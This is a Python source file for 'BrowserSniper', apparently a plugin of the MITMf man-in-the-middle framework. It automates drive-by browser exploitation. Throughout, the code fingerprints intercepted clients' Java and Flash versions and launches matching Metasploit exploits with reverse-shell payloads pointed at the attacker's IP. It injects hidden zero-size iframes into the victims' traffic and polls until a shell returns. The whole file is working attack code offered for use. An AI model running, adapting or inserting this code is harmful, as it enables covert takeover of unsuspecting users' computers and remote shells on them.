#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import string
import random
import logging

from time import sleep
from core.msfrpc import Msf
from core.utils import SystemConfig, shutdown
from plugins.plugin import Plugin
from plugins.BrowserProfiler import BrowserProfiler

mitmf_logger = logging.getLogger("mitmf")

class BrowserSniper(BrowserProfiler, Plugin):
    name        = "BrowserSniper"
    optname     = "browsersniper"
    desc        = "Performs drive-by attacks on clients with out-of-date browser plugins"
    version     = "0.4"
    has_opts    = False

    def initialize(self, options):
        self.options = options
        self.msfip   = SystemConfig.getIP(options.interface)
        self.sploited_ips = list()  #store ip of pwned or not vulnerable clients so we don't re-exploit

        #Initialize the BrowserProfiler plugin
        BrowserProfiler.initialize(self, options)
        
        msfversion = Msf().version()
        self.tree_info.append("Connected to Metasploit v{}".format(msfversion))

    def startThread(self, options):
        self.snipe()

    def onConfigChange(self):
        self.initialize(self.options)

    def _genRandURL(self):  #generates a random url for our exploits (urls are generated with a / at the beginning)
        return "/" + ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, 5))

    def _getRandPort(self):
        return random.randint(1000, 65535)

    def _setupExploit(self, exploit, msfport):

        rand_url = self._genRandURL()
        rand_port = self._getRandPort()
        #generate the command string to send to the virtual console
        #new line character very important as it simulates a user pressing enter
        cmd = "use exploit/{}\n".format(exploit)
        cmd += "set SRVPORT {}\n".format(msfport)
        cmd += "set URIPATH {}\n".format(rand_url)
        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"
        cmd += "set LHOST {}\n".format(self.msfip)
        cmd += "set LPORT {}\n".format(rand_port)
        cmd += "set ExitOnSession False\n"
        cmd += "exploit -j\n"

        Msf().sendcommand(cmd)

        return (rand_url, rand_port)

    def _compat_system(self, os_config, brw_config):
        os = self.output['useragent'][0].lower()
        browser = self.output['useragent'][1].lower()

        if (os_config == 'any') and (brw_config == 'any'):
            return True

        if (os_config == 'any') and (brw_config in browser):
            return True

        if (os_config in os) and (brw_config == 'any'):
            return True

        if (os_config in os) and (brw_config in browser):
            return True

        return False

    def getExploits(self):
        exploits = list()
        vic_ip = self.output['ip']

        #First get the client's info
        java  = None
        if (self.output['java_installed']  == '1') and (self.output['java_version'] != 'null'): 
            java = self.output['java_version']

        flash = None
        if (self.output['flash_installed'] == '1') and (self.output['flash_version'] != 'null'): 
            flash = self.output['flash_version']

        mitmf_logger.debug("{} [BrowserSniper] Java installed: {} | Flash installed: {}".format(vic_ip, java, flash))

        for exploit, details in self.config['BrowserSniper'].iteritems():

            if self._compat_system(details['OS'].lower(), details['Browser'].lower()):
                
                if details['Type'].lower() == 'browservuln':
                    exploits.append(exploit)

                elif details['Type'].lower() == 'pluginvuln':

                    if details['Plugin'].lower() == 'java':
                        if (java is not None) and (java in details['PluginVersions']):
                            exploits.append(exploit)

                    elif details['Plugin'].lower() == 'flash':
                        
                        if (flash is not None) and (flash in details['PluginVersions']):
                            exploits.append(exploit)

        mitmf_logger.debug("{} [BrowserSniper] Compatible exploits: {}".format(vic_ip, exploits))
        return exploits

    def injectAndPoll(self, ip, inject_payload):  #here we inject an iframe to trigger the exploit and check for resulting sessions
        
        #inject iframe
        mitmf_logger.info("{} [BrowserSniper] Now injecting iframe to trigger exploits".format(ip))
        self.html_payload = inject_payload #temporarily changes the code that the Browserprofiler plugin injects

        #The following will poll Metasploit every 2 seconds for new sessions for a maximum of 60 seconds 
        #Will also make sure the shell actually came from the box that we targeted
        mitmf_logger.info('{} [BrowserSniper] Waiting for ze shellz, sit back and relax...'.format(ip))

        poll_n = 1
        msf = Msf()
        while poll_n != 30:
            
            if msf.sessionsfrompeer(ip):
                mitmf_logger.info("{} [BrowserSniper] Client haz been 0wn3d! Enjoy!".format(ip))
                self.sploited_ips.append(ip)
                self.black_ips = self.sploited_ips   #Add to inject blacklist since box has been popped
                self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin
                return

            poll_n += 1
            sleep(2) 

        mitmf_logger.info("{} [BrowserSniper] Session not established after 60 seconds".format(ip))
        self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin

    def snipe(self):
        while True:
            if self.output:
                vic_ip = self.output['ip']
                msfport = self.config['MITMf']['Metasploit']['msfport']
                exploits = self.getExploits()

                if not exploits:
                    if vic_ip not in self.sploited_ips:
                        mitmf_logger.info('{} [BrowserSniper] Client not vulnerable to any exploits, adding to blacklist'.format(vic_ip))
                        self.sploited_ips.append(vic_ip)
                        self.black_ips = self.sploited_ips

                elif exploits and (vic_ip not in self.sploited_ips):
                    mitmf_logger.info("{} [BrowserSniper] Client vulnerable to {} exploits".format(vic_ip, len(exploits)))
                    inject_payload = ''

                    msf = Msf()
                    for exploit in exploits:

                        pid = msf.findpid(exploit)
                        if pid:
                            mitmf_logger.info('{} [BrowserSniper] {} already started'.format(vic_ip, exploit))
                            url = msf.jobinfo(pid)['uripath']  #get the url assigned to the exploit
                            inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, msfport, url)
                        else:
                            url, port = self._setupExploit(exploit, msfport)
                            inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, port, url)

                    self.injectAndPoll(vic_ip, inject_payload)

            sleep(1)
